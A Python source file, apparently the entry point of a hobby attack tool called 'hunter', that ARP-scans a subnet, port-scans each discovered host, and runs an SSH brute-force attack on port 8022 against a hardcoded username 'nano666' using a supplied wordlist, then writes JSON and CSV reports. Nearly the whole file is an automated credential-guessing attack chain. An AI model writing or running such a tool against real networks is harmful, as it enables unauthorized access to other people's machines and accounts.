import sys
from recon.arp_scan import scan, parse_results, display_results
from recon.port_scan import scan_ports
from attack.ssh_brute import brute_force
from reports.report import save_json, save_csv

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 hunter.py <network> <wordlist>")
        print("Example: python3 hunter.py 192.168.0.0/24 attack/wordlist.txt")
        sys.exit(1)

    network = sys.argv[1]
    wordlist = sys.argv[2]

    # Phase 1: ARP scan
    print("\n[*] Phase 1: Network discovery...")
    answered = scan(network)
    hosts = parse_results(answered)
    display_results(hosts)

    # Phase 2: Port scan
    print("\n[*] Phase 2: Port scanning...")
    common_ports = [8022, 80, 443, 8080, 21, 23, 3306]
    report_data = []

    for host in hosts:
        ip = host["ip"]
        open_ports = scan_ports(ip, common_ports)
        print(f"  {ip} -> open ports: {open_ports}")

        # Phase 3: SSH brute force if port 8022 is open
        credentials = {}
        if 8022 in open_ports:
            print(f"\n[*] Phase 3: SSH brute force on {ip}:8022...")
            brute_force(ip, 8022, "nano666", wordlist)

        report_data.append({
            "target": ip,
            "mac": host["mac"],
            "open_ports": open_ports,
        })

    # Phase 4: Save report
    print("\n[*] Phase 4: Saving report...")
    save_json(report_data, "reports/report.json")
    save_csv(report_data, "reports/report.csv")
    print("\n[+] Hunter finished.")

if __name__ == "__main__":
    main()